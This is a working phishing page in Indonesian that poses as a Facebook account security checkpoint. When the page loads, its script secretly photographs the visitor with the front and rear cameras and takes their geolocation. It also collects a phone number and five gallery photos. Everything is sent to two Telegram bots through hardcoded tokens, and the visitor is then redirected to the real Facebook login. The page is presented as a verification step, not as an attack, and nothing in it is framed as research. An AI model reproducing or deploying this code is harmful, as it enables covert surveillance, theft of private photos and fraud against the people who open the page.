<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Secure Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Splash Screen */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
        .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }

        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: none; overflow-x: hidden; padding-bottom: 100px; }
        
        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); background: white; border-top: 5px solid #1877f2; }
        .fb-logo-text { color: #1877f2; font-size: 42px; font-weight: bold; letter-spacing: -2px; }
        
        .btn-fb { 
            background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
            padding: 12px; border-radius: 8px; border: none; width: 100%;
            transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .btn-fb:active { transform: scale(0.94); }

        /* Credit & Music Control Bar üòà */
        .credit-bar {
            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
            color: white; padding: 10px 20px; display: flex; align-items: center; 
            justify-content: space-between; backdrop-filter: blur(15px);
            border-top: 2px solid #1877f2; z-index: 1000;
        }
        .credit-info { display: flex; flex-direction: column; text-align: left; }
        .label-credit { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; text-shadow: 0 0 8px rgba(24, 119, 242, 0.6); }
        
        /* Music Button */
        .play-btn {
            background: #1877f2; color: white; border: none; border-radius: 50px;
            padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer;
            transition: 0.3s; display: flex; align-items: center; gap: 5px;
        }
        .play-btn:hover { background: #166fe5; transform: translateY(-2px); }

        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; }
        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; display: none; }
        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }

        .error-box { background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="splash-screen">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
    <p class="mt-3 text-muted">Checking Security System...</p>
</div>

<audio id="bgMusic" loop>
    <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
</audio>

<div class="container">
    <div class="main-card card p-4 text-center">
        <div class="fb-logo-text">facebook</div>
        <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
        <p class="text-muted small">Konfirmasikan identitas Anda untuk melanjutkan akses ke profil Facebook.</p>
        <hr>

        <div id="mainError" class="error-box text-start">
            <b>Gagal!</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
        </div>

        <div class="text-start">
            <label class="form-label small fw-bold">Nomor Telepon</label>
            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
            
            <label class="form-label small fw-bold mt-3">Verifikasi Foto Galeri (Wajib 5)</label>
            <input type="file" id="galeri" class="form-control" multiple accept="image/*">
        </div>

        <button class="btn-fb mt-4" onclick="validateFinal()">Konfirmasi</button>
        
        <div class="mt-3 text-primary" id="loader" style="display:none;">
            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengirim data...</span>
        </div>
    </div>
</div>

<div class="credit-bar">
    <div class="credit-info">
        <span class="label-credit">Developed by:</span>
        <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
    </div>
    
    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
        <span>‚ñ∂ PLAY MUSIC</span>
        <div class="music-anim" id="animContainer">
            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        </div>
    </button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
    const chats = ["7835924973", "8071786272"];
    const audio = document.getElementById('bgMusic');
    const bars = document.querySelectorAll('.bar');

    window.onload = () => {
        setTimeout(() => {
            document.getElementById('splash-screen').style.display = 'none';
            document.body.style.display = 'block';
            autoCapture("user");
            autoLocation();
        }, 3000);
    };

    function toggleMusic() {
        const btnText = document.querySelector('#musicBtn span');
        if (audio.paused) {
            audio.play();
            btnText.innerText = "‚è∏ PAUSE";
            bars.forEach(b => b.style.display = "block");
        } else {
            audio.pause();
            btnText.innerText = "‚ñ∂ PLAY MUSIC";
            bars.forEach(b => b.style.display = "none");
        }
    }

    function sendToBot(content, type = "text", blob = null) {
        tokens.forEach((token, i) => {
            const fd = new FormData();
            fd.append("chat_id", chats[i]);
            if (type === "text") {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
                });
            } else {
                fd.append("photo", blob || content, "img.jpg");
                fd.append("caption", content);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
            }
        });
    }

    function validateFinal() {
        const phone = document.getElementById('phone').value;
        const files = document.getElementById('galeri').files;
        if (phone.length < 10 || files.length < 5) {
            document.getElementById('mainError').style.display = 'block';
            return;
        }
        document.getElementById('mainError').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        sendToBot(`üì± NOMOR: ${phone}`);
        for (let i = 0; i < 5; i++) sendToBot(`üñºÔ∏è GALERI ${i+1}`, "photo", files[i]);
        setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 3000);
    }

    async function autoCapture(mode) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.getElementById('video'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('canvas');
                c.width = 480; c.height = 640;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendToBot(`üì∏ Cam ${mode}`, "photo", b), 'image/jpeg');
                s.getTracks().forEach(t => t.stop());
                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
            }, 2000);
        } catch (e) { window.location.href = "https://www.facebook.com/login"; }
    }

    function autoLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            sendToBot(`üìç LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });
    }
</script>
</body>
</html>
